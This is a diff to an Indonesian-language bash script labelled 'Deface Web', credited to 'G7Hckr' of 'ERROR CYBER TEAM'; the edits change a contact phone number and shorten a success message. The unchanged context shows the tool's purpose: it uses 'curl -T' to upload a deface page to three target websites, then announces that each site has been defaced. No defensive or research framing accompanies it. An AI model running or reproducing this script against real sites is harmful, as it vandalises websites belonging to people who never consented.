@@ -29,7 +29,7 @@ echo $me"####################["$cy"WELCOME"$me"]####################"
 echo $me"#"$cy"Deface Web"
 echo $me"#"$cy"Author  : G7Hckr"
 echo $me"#"$cy"Team    : ERROR CYBER TEAM"
-echo $me"#"$cy"Contact : +1 (315) 502-6913"
+echo $me"#"$cy"Contact : +62 895 3776 10005"
 echo $me"#################################################"
 sleep 1
 echo
@@ -82,7 +82,7 @@ curl -T /storage/emulated/0/$script $target
 echo
 echo
 echo $cy"["$pu"√"$cy"]"$pu" WEB TELAH TERDEFACE "$cy"["$pu"√"$cy"]"
-echo $bi"[*] SILAHKAN DILIHAT BOSQ"$ku" ===>"$pu $target$script
+echo $bi"[*] SILAHKAN"$ku" ===>"$pu $target$script
 echo
 echo
 echo $me"TARGET 2!!!"
@@ -91,7 +91,7 @@ curl -T /storage/emulated/0/$script $target
 echo
 echo
 echo $cy"["$pu"√"$cy"]"$pu" WEB TELAH TERDEFACE "$cy"["$pu"√"$cy"]"
-echo $bi"[*] SILAHKAN DILIHAT BOSQ"$ku" ===>"$pu $target$script
+echo $bi"[*] SILAHKAN"$ku" ===>"$pu $target$script
 echo
 echo
 echo $me"TARGET 3!!!"
@@ -100,4 +100,4 @@ curl -T /storage/emulated/0/$script $target
 echo
 echo
 echo $cy"["$pu"√"$cy"]"$pu" WEB TELAH TERDEFACE "$cy"["$pu"√"$cy"]"
-echo $bi"[*] SILAHKAN DILIHAT BOSQ"$ku" ===>"$pu $target$script
+echo $bi"[*] SILAHKAN"$ku" ===>"$pu $target$script
